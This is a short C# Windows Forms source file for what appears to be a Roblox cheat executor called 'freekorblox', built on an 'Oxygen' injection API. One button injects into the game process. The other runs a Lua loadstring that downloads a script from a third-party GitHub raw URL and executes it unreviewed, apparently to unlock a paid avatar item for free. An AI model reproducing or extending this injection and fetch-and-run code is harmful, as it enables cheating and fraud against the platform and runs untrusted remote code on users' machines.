﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Oxygen;

namespace freekorblox
{
    public partial class freekorblox : Form
    {
        private string korblox = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/evghenii12/scriptsformyexecutor/main/korblox.txt\"))()";
        public freekorblox()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Oxygen.API.Inject();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Oxygen.Execution.Execute(korblox);
        }
    }
}
